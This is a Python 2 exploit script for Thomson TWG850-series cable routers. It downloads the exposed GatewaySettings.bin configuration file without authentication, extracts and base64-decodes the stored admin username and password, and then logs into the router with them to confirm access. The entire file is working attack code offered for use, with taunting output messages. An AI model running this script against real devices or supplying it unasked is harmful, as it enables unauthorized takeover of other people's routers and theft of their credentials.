import string
import urllib2
import sys
from time import sleep
import base64
import binascii
import os

save  = 'storage/logs/log_TWG8504B.txt'
log   = open(save,'w')
bifi  = 'GatewaySettings.bin'
refi  = 'RgComputers.asp'
R_C   = ("\033[0;31m")
G_C   = ("\033[1;32m")
D_C   = ("\033[0m"   )


def banner():
    print ""

def hr_data(filename, min=4):
	with open(filename, "rb") as f:
        	result = ""
        	for c in f.read():
            		if c in string.printable:
                		result += c
                		continue
            		if len(result) >= min:
                		yield result
				print >> log, result
            		result = ""
		print "(+)- Others Informations Extracted were saved in %s, but you've a Admin Password :D\n"%(save)

def checkcreds(router,username,password):
	auth_handler = urllib2.HTTPBasicAuthHandler()
	auth_handler.add_password(realm='Thomson',
                          uri	= router,
                          user 	= username,
                          passwd= password)
	opener = urllib2.build_opener(auth_handler)
	try:
        	urllib2.install_opener(opener)
        	status = urllib2.urlopen('%s/%s'%(router,refi))
        	print '(+)- [status:%s%s%s] Authenticated successfuly, Enjoy it, Mr. Rob0t!'%(G_C,status.code,D_C)

	except urllib2.URLError, e:
    		if e.code == 401:
        		print '(+)- [status:%s%s%s] Invalid Credentials! Try yourself in a browser.'%(R_C,e.code,D_C)

def checkvuln(router):
	try:
		print '(+)- Checking if target is vulnerable...'
		req = urllib2.Request('%s/%s'%(router,bifi))
		response = urllib2.urlopen(req)
		page = response.read()
		x = open(bifi,'wb')
		x.write(page)
		x.close()
		sleep(2)
		print '(+)- The target appears to be vulnerable, lets check it better!'
		print '(+)- Searching Credentials...'
		sleep(1)
		print '(+)- Decoding...'
		for s in hr_data(bifi):
			try:
				dec = base64.decodestring(s)
				if dec.find(':') != -1:
					user,passwd = dec.split(':')
					print '(+)- User: %s%s%s'%(G_C,user,D_C)
					print '(+)- Pass: %s%s%s'%(G_C,passwd,D_C)
					
					print '(+)- Checking if creds are OK...'
					checkcreds(router,user,passwd)
					
			except(binascii.Error):
				pass
	except urllib2.URLError, e:
		print '[$] hollyshit! the target is not vuln! o_O'
		sys.exit(1)

if __name__ == "__main__":
	banner()
        if len(sys.argv) != 2:
                print '[!] %sRun %s router IP%s\n'%(R_C,sys.argv[0],D_C)
                sys.exit(2)
	
        router = sys.argv[1]
        if not "http" in router:
                        router = "http://"+(sys.argv[1])
        checkvuln(router)
